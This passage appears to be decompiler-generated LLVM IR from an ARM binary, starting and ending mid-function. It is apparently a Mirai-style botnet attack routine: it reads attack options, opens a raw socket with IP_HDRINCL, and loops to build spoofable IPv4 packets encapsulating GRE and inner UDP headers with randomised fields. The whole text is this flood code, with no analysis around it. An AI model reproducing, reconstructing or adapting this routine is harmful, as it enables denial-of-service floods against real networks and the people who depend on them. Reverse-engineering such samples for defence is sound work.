  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 65535, i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp89 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp89 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp90, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, 65535
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ 65535, %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %bb88, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
